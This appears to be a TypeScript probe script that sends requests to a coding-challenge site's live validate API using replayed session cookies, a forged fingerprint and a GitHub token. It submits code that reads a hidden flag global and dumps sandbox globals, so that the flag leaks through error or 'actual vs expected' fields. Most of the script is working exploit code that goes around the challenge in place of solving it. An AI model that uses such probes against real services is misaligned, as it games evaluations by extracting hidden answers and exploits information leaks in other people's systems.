// Does v3's /api/level-1/validate leak "actual vs expected" like v2 did?
// The public v2 source (calebpeffer/cheetcode src/app/api/validate/route.ts) says it
// "Returns actual vs expected on failure so agents can probe the sandbox" and injects
// globalThis.__FIRECRAWL__ = HIDDEN_FLAG. If v3 kept that leak, we read the flag (and any
// sandbox value) straight out of the response — no binary-search oracle needed.
//
// Submits code that RETURNS diagnostic values, forcing a wrong answer, and dumps the
// ENTIRE validate response so we can see every field (actual/expected/error/...).
//
//   export CHEETCODE_GITHUB_PAT=ghp_...
//   CHEETCODE_GITHUB=<pat-owner-login> \
//   CHEETCODE_FINGERPRINT_HINTS_PATH=recon-output/safari-session-2026-08-28T0008/fingerprint-hints.json \
//   npx tsx src/level1-validate-leak.ts
//
// ponytail: single-file diagnostic; delete after the leak question is settled.
import { promises as fs } from "node:fs";
import crypto from "node:crypto";
import { loadEnvFile } from "./env.js";
import { buildCookieHeader, buildFingerprintHints } from "./level1/api.js";
import { extractFunctionName } from "./level1/solutions.js";
import type { LevelSession, CheetProblem } from "./level1/types.js";
import { TARGET_URL, STORAGE_STATE_PATH } from "./recon/capture.js";

loadEnvFile();

const github = (process.env.CHEETCODE_GITHUB || "").trim();
if (!github) throw new Error("Set CHEETCODE_GITHUB to the login that owns CHEETCODE_GITHUB_PAT.");

const storage = JSON.parse(await fs.readFile(STORAGE_STATE_PATH, "utf8"));
const cookie = buildCookieHeader(storage.cookies, new URL(TARGET_URL).hostname);
const hintsPath = process.env.CHEETCODE_FINGERPRINT_HINTS_PATH;
const fingerprintHints = hintsPath
  ? JSON.parse(await fs.readFile(hintsPath, "utf8"))
  : buildFingerprintHints(crypto.randomBytes(16).toString("hex"), Date.now());
const headers: Record<string, string> = {
  "content-type": "application/json",
  referer: TARGET_URL,
  cookie,
  "x-client-fingerprint": fingerprintHints.fingerprintId
};
if (process.env.CHEETCODE_GITHUB_PAT) headers["authorization"] = `Bearer ${process.env.CHEETCODE_GITHUB_PAT}`;

async function post<T>(path: string, body: unknown): Promise<T> {
  const r = await fetch(new URL(path, TARGET_URL), { method: "POST", headers, body: JSON.stringify(body) });
  const text = await r.text();
  if (!r.ok) throw new Error(`${path} ${r.status}: ${text.slice(0, 300)}`);
  return JSON.parse(text) as T;
}

const session = await post<LevelSession>("/api/session", { level: 1, isDev: false, fingerprintHints });
const p = (session.problems as CheetProblem[])[0];
const NAME = extractFunctionName(p.signature)!;
console.log(`probe problem: ${p.title} | ${p.signature}`);

// Each snippet returns a diagnostic value so a leaked "actual" would carry it.
const probes: Record<string, string> = {
  raw_firecrawl: `function ${NAME}(){ return globalThis.__FIRECRAWL__; }`,
  json_all_globals: `function ${NAME}(){ return JSON.stringify(Object.getOwnPropertyNames(globalThis)); }`,
  typeof_firecrawl: `function ${NAME}(){ return "typeof=" + (typeof globalThis.__FIRECRAWL__); }`,
  string_globals_join: `function ${NAME}(){ return Object.getOwnPropertyNames(globalThis).join("|"); }`,
  throw_firecrawl: `function ${NAME}(){ throw new Error("FC=" + globalThis.__FIRECRAWL__); }`
};

for (const [label, code] of Object.entries(probes)) {
  try {
    const res = await post<Record<string, unknown>>("/api/level-1/validate", {
      sessionId: session.sessionId,
      problemId: p.id,
      code
    });
    console.log(`\n### ${label}`);
    console.log("  response keys:", Object.keys(res).join(", "));
    console.log("  " + JSON.stringify(res).slice(0, 1200));
  } catch (e) {
    console.log(`\n### ${label}\n  ERROR: ${e instanceof Error ? e.message : String(e)}`);
  }
}
console.log("\n(look for any field beyond 'passed' — actual/expected/error/output that carries the FC= value or the globals list)");
